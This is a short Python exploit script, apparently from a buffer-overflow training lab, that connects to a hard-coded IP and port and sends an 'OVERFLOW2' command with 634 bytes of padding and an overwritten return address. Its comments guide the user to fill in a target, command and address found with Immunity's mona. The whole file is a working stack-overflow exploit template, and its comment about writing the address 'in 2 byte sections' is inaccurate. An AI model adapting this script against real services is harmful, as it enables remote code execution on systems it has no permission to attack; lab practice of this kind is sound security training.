#!/usr/bin/env python3
import sys, socket

returnaddress = "\xbb\x11\x50\x62" #This can be gathered from the result of our mona find command within Immunity, remember it will need to be written backwards and in 2 byte sections.

shellcode = "A" * 634 + returnaddress
address = '10.10.211.46' #CHANGE THIS
port = 1337 #CHANGE THIS
vulncommand = 'OVERFLOW2 ' # CHANGE THIS, the vulnerable command that was found in the spiking section would go here

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((address,port))

        s.send(bytes(vulncommand + shellcode, "latin-1"))
        s.close()

except:
        print("Error connecting to server")
        sys.exit()
